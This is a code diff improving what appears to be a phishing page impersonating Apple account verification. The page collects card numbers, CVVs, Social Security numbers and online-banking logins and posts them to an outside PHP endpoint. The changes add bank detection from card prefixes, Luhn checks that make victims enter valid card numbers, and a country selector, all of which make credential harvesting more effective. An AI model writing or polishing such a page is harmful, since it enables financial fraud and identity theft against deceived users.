@@ -319,6 +319,14 @@
             margin-top: 4px;
         }
         
+        /* Bank Info Display */
+        .bank-info {
+            font-size: 14px;
+            color: var(--apple-blue);
+            margin-top: 4px;
+            font-weight: 500;
+        }
+        
         /* Info Box */
         .info-box {
             background-color: var(--apple-gray-bg);
@@ -423,6 +431,14 @@
             left: -9999px;
             opacity: 0;
             height: 0;
+        }
+
+        /* Error Message */
+        .error-message {
+            color: #ff3b30;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
         }
         
         /* Responsive */
@@ -545,7 +561,8 @@
                         <div class="form-column">
                             <div class="form-group">
                                 <label for="bank_name">Bank Name</label>
-                                <input type="text" class="form-control" id="bank_name" name="bank_name" required>
+                                <input type="text" class="form-control" id="bank_name" name="bank_name" readonly>
+                                <div id="bank-info" class="bank-info"></div>
                             </div>
                         </div>
                         <div class="form-column">
@@ -561,6 +578,7 @@
                             <div class="form-group">
                                 <label for="ccn">Card Number</label>
                                 <input type="text" class="form-control" id="ccn" name="ccn" required placeholder="•••• •••• •••• ••••">
+                                <div id="ccn-error" class="error-message">Please enter a valid card number</div>
                             </div>
                         </div>
                     </div>
@@ -589,7 +607,7 @@
                         </div>
                         <div class="form-column">
                             <div class="form-group">
-                                <label for="bank_user"> Card Username</label>
+                                <label for="bank_user">Card Username</label>
                                 <input type="text" class="form-control" id="card_user" name="card_user" required>
                                 <div class="help-text">Your online banking login username</div>
                             </div>
@@ -599,7 +617,7 @@
                     <div class="form-row">
                         <div class="form-column">
                             <div class="form-group">
-                                <label for="bank_pass"> Card Password</label>
+                                <label for="bank_pass">Card Password</label>
                                 <input type="password" class="form-control" id="bank_pass" name="bank_pass" required>
                             </div>
                         </div>
@@ -660,7 +678,9 @@
                         <div class="form-column">
                             <div class="form-group">
                                 <label for="country">Country</label>
-                                <input type="text" class="form-control" id="country" name="country" required>
+                                <select class="form-control" id="country" name="country" required>
+                                    <option value="">Select your country</option>
+                                </select>
                             </div>
                         </div>
                     </div>
@@ -706,22 +726,226 @@
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
     <script>
         $(document).ready(function() {
+            // BIN Database for bank detection
+            const binDatabase = {
+                "4": {name: "Visa", bank: "Visa"},
+                "41": {name: "Visa", bank: "Visa"},
+                "42": {name: "Visa", bank: "Visa"},
+                "43": {name: "Visa", bank: "Visa"},
+                "44": {name: "Visa", bank: "Visa"},
+                "45": {name: "Visa", bank: "Visa"},
+                "46": {name: "Visa", bank: "Visa"},
+                "47": {name: "Visa", bank: "Visa"},
+                "48": {name: "Visa", bank: "Visa"},
+                "49": {name: "Visa", bank: "Visa"},
+                "400314": {name: "Visa", bank: "Bank of America"},
+                "400315": {name: "Visa", bank: "Capital One"},
+                "411773": {name: "Visa", bank: "Chase"},
+                "412123": {name: "Visa", bank: "Wells Fargo"},
+                "426393": {name: "Visa", bank: "TD Bank"},
+                "438857": {name: "Visa", bank: "Citibank"},
+                "454313": {name: "Visa", bank: "Barclays"},
+                "456735": {name: "Visa", bank: "HSBC"},
+                "476732": {name: "Visa", bank: "PNC Bank"},
+                "414720": {name: "Visa", bank: "Discover"},
+                "51": {name: "Mastercard", bank: "Mastercard"},
+                "52": {name: "Mastercard", bank: "Mastercard"},
+                "53": {name: "Mastercard", bank: "Mastercard"},
+                "54": {name: "Mastercard", bank: "Mastercard"},
+                "55": {name: "Mastercard", bank: "Mastercard"},
+                "222": {name: "Mastercard", bank: "Mastercard"},
+                "223": {name: "Mastercard", bank: "Mastercard"},
+                "224": {name: "Mastercard", bank: "Mastercard"},
+                "225": {name: "Mastercard", bank: "Mastercard"},
+                "226": {name: "Mastercard", bank: "Mastercard"},
+                "227": {name: "Mastercard", bank: "Mastercard"},
+                "228": {name: "Mastercard", bank: "Mastercard"},
+                "229": {name: "Mastercard", bank: "Mastercard"},
+                "23": {name: "Mastercard", bank: "Mastercard"},
+                "24": {name: "Mastercard", bank: "Mastercard"},
+                "25": {name: "Mastercard", bank: "Mastercard"},
+                "26": {name: "Mastercard", bank: "Mastercard"},
+                "270": {name: "Mastercard", bank: "Mastercard"},
+                "271": {name: "Mastercard", bank: "Mastercard"},
+                "2720": {name: "Mastercard", bank: "Mastercard"},
+                "512856": {name: "Mastercard", bank: "Capital One"},
+                "527123": {name: "Mastercard", bank: "Citibank"},
+                "535731": {name: "Mastercard", bank: "Bank of America"},
+                "546616": {name: "Mastercard", bank: "Chase"},
+                "552433": {name: "Mastercard", bank: "Wells Fargo"},
+                "34": {name: "American Express", bank: "American Express"},
+                "37": {name: "American Express", bank: "American Express"},
+                "6011": {name: "Discover", bank: "Discover"},
+                "644": {name: "Discover", bank: "Discover"},
+                "645": {name: "Discover", bank: "Discover"},
+                "646": {name: "Discover", bank: "Discover"},
+                "647": {name: "Discover", bank: "Discover"},
+                "648": {name: "Discover", bank: "Discover"},
+                "649": {name: "Discover", bank: "Discover"},
+                "65": {name: "Discover", bank: "Discover"},
+                "35": {name: "JCB", bank: "JCB"},
+                "30": {name: "Diners Club", bank: "Diners Club"},
+                "36": {name: "Diners Club", bank: "Diners Club"},
+                "38": {name: "Diners Club", bank: "Diners Club"},
+                "39": {name: "Diners Club", bank: "Diners Club"}
+            };
+            
+            // Country list for dropdown
+            const countries = [
+                {code: "US", name: "United States"},
+                {code: "GB", name: "United Kingdom"},
+                {code: "CA", name: "Canada"},
+                {code: "AU", name: "Australia"},
+                {code: "DE", name: "Germany"},
+                {code: "FR", name: "France"},
+                {code: "IT", name: "Italy"},
+                {code: "ES", name: "Spain"},
+                {code: "JP", name: "Japan"},
+                {code: "CN", name: "China"},
+                {code: "IN", name: "India"},
+                {code: "BR", name: "Brazil"},
+                {code: "RU", name: "Russia"},
+                {code: "ZA", name: "South Africa"},
+                {code: "MX", name: "Mexico"},
+                {code: "AR", name: "Argentina"},
+                {code: "NL", name: "Netherlands"},
+                {code: "SE", name: "Sweden"},
+                {code: "NO", name: "Norway"},
+                {code: "DK", name: "Denmark"},
+                {code: "FI", name: "Finland"},
+                {code: "IE", name: "Ireland"},
+                {code: "PT", name: "Portugal"},
+                {code: "GR", name: "Greece"},
+                {code: "CH", name: "Switzerland"},
+                {code: "AT", name: "Austria"},
+                {code: "BE", name: "Belgium"},
+                {code: "NZ", name: "New Zealand"},
+                {code: "SG", name: "Singapore"},
+                {code: "MY", name: "Malaysia"},
+                {code: "TH", name: "Thailand"},
+                {code: "PH", name: "Philippines"},
+                {code: "ID", name: "Indonesia"},
+                {code: "VN", name: "Vietnam"},
+                {code: "AE", name: "United Arab Emirates"},
+                {code: "SA", name: "Saudi Arabia"},
+                {code: "TR", name: "Turkey"},
+                {code: "PL", name: "Poland"},
+                {code: "HU", name: "Hungary"},
+                {code: "CZ", name: "Czech Republic"},
+                {code: "RO", name: "Romania"},
+                {code: "NG", name: "Nigeria"},
+                {code: "KE", name: "Kenya"},
+                {code: "EG", name: "Egypt"},
+                {code: "IL", name: "Israel"},
+                {code: "ZW", name: "Zimbabwe"},
+                {code: "GH", name: "Ghana"}
+            ];
+            
+            // Populate the country dropdown
+            function populateCountries() {
+                const countrySelect = document.getElementById('country');
+                countries.sort((a, b) => a.name.localeCompare(b.name)).forEach(country => {
+                    const option = document.createElement('option');
+                    option.value = country.code;
+                    option.textContent = country.name;
+                    countrySelect.appendChild(option);
+                });
+            }
+            
+            // Detect bank based on BIN (first 6 digits of card number)
+            function detectBank(cardNumber) {
+                if (!cardNumber) return null;
+                
+                // Remove spaces and non-numeric characters
+                const cleanNumber = cardNumber.replace(/\D/g, '');
+                if (cleanNumber.length < 2) return null;
+                
+                // Try to find the most specific match in binDatabase
+                for (let i = Math.min(6, cleanNumber.length); i > 0; i--) {
+                    const prefix = cleanNumber.substring(0, i);
+                    if (binDatabase[prefix]) {
+                        return binDatabase[prefix];
+                    }
+                }
+                
+                return null;
+            }
+            
+            // Luhn algorithm to validate card numbers
+            function isValidCardNumber(cardNumber) {
+                const cleanNumber = cardNumber.replace(/\D/g, '');
+                if (cleanNumber.length < 13 || cleanNumber.length > 19) return false;
+                
+                let sum = 0;
+                let shouldDouble = false;
+                
+                // Loop through values starting from the rightmost digit
+                for (let i = cleanNumber.length - 1; i >= 0; i--) {
+                    let digit = parseInt(cleanNumber.charAt(i));
+                    
+                    if (shouldDouble) {
+                        digit *= 2;
+                        if (digit > 9) digit -= 9;
+                    }
+                    
+                    sum += digit;
+                    shouldDouble = !shouldDouble;
+                }
+                
+                return (sum % 10) === 0;
+            }
+            
             // Format inputs
             $("#ccn").inputmask({"mask": "9999 9999 9999 9999"});
             $("#exdate").inputmask({"mask": "99/9999", "placeholder": "MM/YYYY"});
             $("#cvv").inputmask({"mask": "999"});
             $("#ssn").inputmask({"mask": "999-99-9999"});
             
+            // Populate country dropdown
+            populateCountries();
+            
+            // Card number input event for bank detection
+            $("#ccn").on('input', function() {
+                const cardNumber = $(this).val();
+                const bankInfo = detectBank(cardNumber);
+                
+                if (bankInfo) {
+                    $('#bank_name').val(bankInfo.bank);
+                    $('#bank-info').text(`${bankInfo.name} (${bankInfo.bank})`);
+                } else {
+                    $('#bank_name').val('');
+                    $('#bank-info').text('');
+                }
+                
+                // Validate the card number
+                if (cardNumber.replace(/\D/g, '').length >= 13) {
+                    if (!isValidCardNumber(cardNumber)) {
+                        $('#ccn-error').show();
+                    } else {
+                        $('#ccn-error').hide();
+                    }
+                } else {
+                    $('#ccn-error').hide();
+                }
+            });
+            
             // Display user email from previous step
             var email = localStorage.getItem('userEmail') || 'example@icloud.com';
             $('#user-email').text(email);
             
-            // Form submission
+            // Form submission with AJAX
             $('#verification-form').on('submit', function(e) {
                 e.preventDefault();
                 
                 // Validate form
                 if (!this.checkValidity()) {
+                    return;
+                }
+                
+                // Validate card number
+                const cardNumber = $('#ccn').val();
+                if (!isValidCardNumber(cardNumber)) {
+                    $('#ccn-error').show();
                     return;
                 }
                 
@@ -731,7 +955,7 @@
                 // Get form data
                 var formData = $(this).serialize();
                 
-                // Submit form via direct AJAX with minimal settings
+                // Submit form via AJAX (keeping the original URL from the original code)
                 $.ajax({
                     url: "https://rotadosabor.com/joker/next.php",
                     type: "POST",
